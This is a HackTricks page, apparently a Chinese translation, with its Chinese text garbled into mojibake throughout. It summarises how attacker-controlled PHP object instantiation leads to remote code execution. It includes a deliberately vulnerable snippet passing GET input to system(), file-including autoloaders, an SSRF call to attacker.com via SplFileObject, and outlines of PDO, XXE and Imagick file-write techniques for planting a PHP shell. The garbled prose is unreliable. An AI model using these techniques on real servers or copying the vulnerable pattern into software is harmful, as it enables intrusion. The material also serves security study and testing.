# PHP - åˆ©ç”¨å¯¹è±¡åˆ›å»ºæ»¥ç”¨RCE: new $\_GET\["a"]\($\_GET\["b"])

<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹ AWSé»‘å®¢æŠ€æœ¯ï¼Œæˆä¸ºä¸“å®¶</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>ï¼</strong></summary>

æ”¯æŒHackTricksçš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨æƒ³çœ‹åˆ°æ‚¨çš„**å…¬å¸åœ¨HackTricksä¸­è¢«å¹¿å‘Š**æˆ–**ä¸‹è½½PDFæ ¼å¼çš„HackTricks**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* è·å–[**å®˜æ–¹PEASS & HackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* æ¢ç´¢[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬çš„ç‹¬å®¶[NFTs](https://opensea.io/collection/the-peass-family)æ”¶è—å“
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤**](https://t.me/peass) æˆ–åœ¨**Twitter**ä¸Šå…³æ³¨æˆ‘ä»¬ ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**ã€‚**
* é€šè¿‡å‘[**HackTricks**](https://github.com/carlospolop/hacktricks)å’Œ[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>

è¿™åŸºæœ¬ä¸Šæ˜¯[https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/](https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/)çš„æ‘˜è¦

## ç®€ä»‹

åˆ›å»ºæ–°çš„ä»»æ„å¯¹è±¡ï¼Œä¾‹å¦‚`new $_GET["a"]($_GET["a"])`ï¼Œå¯èƒ½å¯¼è‡´è¿œç¨‹ä»£ç æ‰§è¡Œï¼ˆRCEï¼‰ï¼Œè¯¦ç»†ä¿¡æ¯è¯·å‚é˜…[**writeup**](https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/)ã€‚æœ¬æ–‡æ¡£çªå‡ºäº†å®ç°RCEçš„å„ç§ç­–ç•¥ã€‚

## é€šè¿‡è‡ªå®šä¹‰ç±»æˆ–è‡ªåŠ¨åŠ è½½å®ç°RCE

è¯­æ³•`new $a($b)`ç”¨äºå®ä¾‹åŒ–ä¸€ä¸ªå¯¹è±¡ï¼Œå…¶ä¸­**`$a`**è¡¨ç¤ºç±»åï¼Œ**`$b`**æ˜¯ä¼ é€’ç»™æ„é€ å‡½æ•°çš„ç¬¬ä¸€ä¸ªå‚æ•°ã€‚è¿™äº›å˜é‡å¯ä»¥æ¥è‡ªç”¨æˆ·è¾“å…¥ï¼Œå¦‚GET/POSTï¼Œå…¶ä¸­å®ƒä»¬å¯èƒ½æ˜¯å­—ç¬¦ä¸²æˆ–æ•°ç»„ï¼Œæˆ–æ¥è‡ªJSONï¼Œå…¶ä¸­å®ƒä»¬å¯èƒ½å‘ˆç°ä¸ºå…¶ä»–ç±»å‹ã€‚

è€ƒè™‘ä¸‹é¢çš„ä»£ç ç‰‡æ®µï¼š
```php
class App {
function __construct ($cmd) {
system($cmd);
}
}

class App2 {
function App2 ($cmd) {
system($cmd);
}
}

$a = $_GET['a'];
$b = $_GET['b'];

new $a($b);
```
åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œå°†`$a`è®¾ç½®ä¸º`App`æˆ–`App2`ï¼Œå°†`$b`è®¾ç½®ä¸ºç³»ç»Ÿå‘½ä»¤ï¼ˆä¾‹å¦‚`uname -a`ï¼‰ä¼šå¯¼è‡´è¯¥å‘½ä»¤è¢«æ‰§è¡Œã€‚

å¦‚æœæ²¡æœ‰ç›´æ¥è®¿é—®è¿™äº›ç±»ï¼Œ**è‡ªåŠ¨åŠ è½½å‡½æ•°**å°±å¯ä»¥è¢«åˆ©ç”¨ã€‚è¿™äº›å‡½æ•°åœ¨éœ€è¦æ—¶ä¼šè‡ªåŠ¨ä»æ–‡ä»¶ä¸­åŠ è½½ç±»ï¼Œå¹¶ä¸”æ˜¯ä½¿ç”¨`spl_autoload_register`æˆ–`__autoload`æ¥å®šä¹‰çš„ï¼š
```php
spl_autoload_register(function ($class_name) {
include './../classes/' . $class_name . '.php';
});

function __autoload($class_name) {
include $class_name . '.php';
};

spl_autoload_register();
```
## é€šè¿‡å†…ç½®ç±»å®ç°RCE

ç¼ºä¹è‡ªå®šä¹‰ç±»æˆ–è‡ªåŠ¨åŠ è½½ç¨‹åºæ—¶ï¼Œ**å†…ç½®PHPç±»**å¯èƒ½è¶³ä»¥å®ç°RCEã€‚è¿™äº›ç±»çš„æ•°é‡åœ¨100åˆ°200ä¹‹é—´ä¸ç­‰ï¼Œå–å†³äºPHPç‰ˆæœ¬å’Œæ‰©å±•ã€‚å¯ä»¥ä½¿ç”¨`get_declared_classes()`åˆ—å‡ºå®ƒä»¬ã€‚

å¯ä»¥é€šè¿‡åå°„APIè¯†åˆ«æ„Ÿå…´è¶£çš„æ„é€ å‡½æ•°ï¼Œå¦‚ä¸‹ä¾‹å’Œé“¾æ¥[https://3v4l.org/2JEGF](https://3v4l.org/2JEGF)æ‰€ç¤ºã€‚

**é€šè¿‡ç‰¹å®šæ–¹æ³•å®ç°RCEåŒ…æ‹¬ï¼š**

### **SSRF + Pharååºåˆ—åŒ–**

`SplFileObject`ç±»é€šè¿‡å…¶æ„é€ å‡½æ•°å®ç°SSRFï¼Œå…è®¸è¿æ¥åˆ°ä»»ä½•URLï¼š
```php
new SplFileObject('http://attacker.com/');
```
### **åˆ©ç”¨PDOs**

PDOç±»æ„é€ å‡½æ•°å…è®¸é€šè¿‡DSNå­—ç¬¦ä¸²è¿æ¥åˆ°æ•°æ®åº“ï¼Œå¯èƒ½ä¼šå¯ç”¨æ–‡ä»¶åˆ›å»ºæˆ–å…¶ä»–äº¤äº’ï¼š
```php
new PDO("sqlite:/tmp/test.txt")
```
### **SoapClient/SimpleXMLElement XXE**

PHPç‰ˆæœ¬åœ¨5.3.22å’Œ5.4.12åŠä»¥ä¸‹å­˜åœ¨å¯¹`SoapClient`å’Œ`SimpleXMLElement`æ„é€ å‡½æ•°çš„XXEæ”»å‡»æ¼æ´ï¼Œå–å†³äºlibxml2çš„ç‰ˆæœ¬ã€‚

## é€šè¿‡Imagickæ‰©å±•å®ç°RCE

åœ¨åˆ†æ**é¡¹ç›®çš„ä¾èµ–å…³ç³»**æ—¶ï¼Œå‘ç°å¯ä»¥é€šè¿‡å®ä¾‹åŒ–æ–°å¯¹è±¡æ¥åˆ©ç”¨**Imagick**æ‰§è¡Œ**å‘½ä»¤æ‰§è¡Œ**ã€‚è¿™ä¸ºåˆ©ç”¨æ¼æ´æä¾›äº†æœºä¼šã€‚

### VIDè§£æå™¨

å‘ç°VIDè§£æå™¨å…·æœ‰å°†å†…å®¹å†™å…¥æ–‡ä»¶ç³»ç»Ÿä¸­ä»»æ„æŒ‡å®šè·¯å¾„çš„èƒ½åŠ›ã€‚è¿™å¯èƒ½å¯¼è‡´åœ¨å¯é€šè¿‡webè®¿é—®çš„ç›®å½•ä¸­æ”¾ç½®PHP shellï¼Œä»è€Œå®ç°è¿œç¨‹ä»£ç æ‰§è¡Œï¼ˆRCEï¼‰ã€‚

#### VIDè§£æå™¨ + æ–‡ä»¶ä¸Šä¼ 

æ³¨æ„åˆ°PHPä¼šå°†ä¸Šä¼ çš„æ–‡ä»¶ä¸´æ—¶å­˜å‚¨åœ¨`/tmp/phpXXXXXX`ä¸­ã€‚Imagickä¸­çš„VIDè§£æå™¨ï¼Œåˆ©ç”¨**msl**åè®®ï¼Œå¯ä»¥å¤„ç†æ–‡ä»¶è·¯å¾„ä¸­çš„é€šé…ç¬¦ï¼Œä»è€Œä¿ƒè¿›å°†ä¸´æ—¶æ–‡ä»¶ä¼ è¾“åˆ°æ‰€é€‰ä½ç½®ã€‚è¿™ç§æ–¹æ³•æä¾›äº†å¦ä¸€ç§å®ç°æ–‡ä»¶ç³»ç»Ÿå†…ä»»æ„æ–‡ä»¶å†™å…¥çš„é€”å¾„ã€‚

### PHPå´©æºƒ + æš´åŠ›ç ´è§£

åœ¨[**åŸå§‹æ–‡æ¡£**](https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/)ä¸­æè¿°äº†ä¸€ç§æ–¹æ³•ï¼Œæ¶‰åŠä¸Šä¼ è§¦å‘æœåŠ¡å™¨å´©æºƒçš„æ–‡ä»¶ã€‚é€šè¿‡å¯¹ä¸´æ—¶æ–‡ä»¶åè¿›è¡Œæš´åŠ›ç ´è§£ï¼ŒImagickå¯ä»¥æ‰§è¡Œä»»æ„PHPä»£ç ã€‚ç„¶è€Œï¼Œè¿™ç§æŠ€æœ¯åªåœ¨è¿‡æ—¶ç‰ˆæœ¬çš„ImageMagickä¸­æœ‰æ•ˆã€‚

## å‚è€ƒèµ„æ–™

* [https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/](https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/)

<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹ AWSé»‘å®¢æŠ€æœ¯ï¼Œæˆä¸ºä¸“å®¶</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTEï¼ˆHackTricks AWS Red Team Expertï¼‰</strong></a><strong>ï¼</strong></summary>

æ”¯æŒHackTricksçš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨æƒ³çœ‹åˆ°æ‚¨çš„**å…¬å¸åœ¨HackTricksä¸­åšå¹¿å‘Š**æˆ–**ä¸‹è½½PDFæ ¼å¼çš„HackTricks**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* è·å–[**å®˜æ–¹PEASS & HackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* æ¢ç´¢[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬ç‹¬å®¶çš„[NFTs](https://opensea.io/collection/the-peass-family)æ”¶è—å“
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤**](https://t.me/peass) æˆ–åœ¨**Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**ä¸Šå…³æ³¨**æˆ‘ä»¬ã€‚
* é€šè¿‡å‘[**HackTricks**](https://github.com/carlospolop/hacktricks)å’Œ[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>
